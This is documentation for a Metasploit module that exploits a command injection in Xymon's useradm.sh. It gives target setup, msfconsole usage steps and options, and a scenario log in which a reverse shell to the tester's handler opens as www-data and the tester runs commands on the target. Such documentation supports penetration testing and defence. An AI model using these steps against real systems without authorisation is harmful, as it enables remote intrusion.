## Description

  This module exploits a command injection vulnerability in Xymon
  versions before 4.3.25 which allows authenticated users
  to execute arbitrary operating system commands as the web
  server user.

  When adding a new user to the system via the web interface with
  `useradm.sh`, the user's username and password are passed to
  `htpasswd` in a call to `system()` without validation.


## Vulnerable Software

  [Xymon](http://xymon.sourceforge.net/) is a system for monitoring servers and networks.

  This module has been tested successfully on:

  * Xymon version 4.3.10 on Debian 6.

  Xymon packages are available in software repositories for various Linux distributions :

  ```
  sudo apt-get install xymon
  ```

  Refer to http://xymon.sourceforge.net/xymon/help/install.html for more information.

  A Xymon virtual appliance is also available :

  * https://sourceforge.net/projects/xymon/files/Xymon/4.3.10/VM/

  To enable authentication via the web interace, add a user to `/etc/xymon/xymonpasswd` :

  ```
  htpasswd /etc/xymon/xymonpasswd <username>
  ```


## Verification Steps

  1. Start `msfconsole`
  2. Do: `use exploit/unix/webapp/xymon_useradm_cmd_exec`
  3. Do: `set rhosts <IP>`
  4. Do: `set username <username>`
  5. Do: `set password <password>`
  6. Do: `run`
  7. You should get a new session


## Options

  **TARGETURI**

  The base path to Xymon secure CGI directory (default: `/xymon-seccgi/`)

  **USERNAME**

  The username for Xymon

  **PASSWORD**

  The password for Xymon


## Scenarios

  ```
  msf5 > use exploit/unix/webapp/xymon_useradm_cmd_exec 
  msf5 exploit(unix/webapp/xymon_useradm_cmd_exec) > set rhosts xymon.local
  rhosts => xymon.local
  msf5 exploit(unix/webapp/xymon_useradm_cmd_exec) > set username admin
  username => admin
  msf5 exploit(unix/webapp/xymon_useradm_cmd_exec) > set password password
  password => password
  msf5 exploit(unix/webapp/xymon_useradm_cmd_exec) > set verbose true
  verbose => true
  msf5 exploit(unix/webapp/xymon_useradm_cmd_exec) > check

  [*] 10.1.1.132:80 - Xymon version 4.3.10
  [*] 10.1.1.132:80 - The target appears to be vulnerable.
  msf5 exploit(unix/webapp/xymon_useradm_cmd_exec) > run

  [*] Started reverse TCP handler on 10.1.1.170:4444 
  [*] 10.1.1.132:80 - Xymon version 4.3.10
  [+] 10.1.1.132:80 - Payload sent successfully
  [*] Command shell session 1 opened (10.1.1.170:4444 -> 10.1.1.132:47682) at 2019-07-02 09:43:13 -0400

  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  pwd
  /usr/lib/xymon/cgi-secure
  ls
  ackinfo.sh
  acknowledge.sh
  criticaleditor.sh
  enadis.sh
  useradm.sh
  uname -a
  Linux xymon 2.6.32-5-686 #1 SMP Sun May 6 04:01:19 UTC 2012 i686 GNU/Linux
  ```

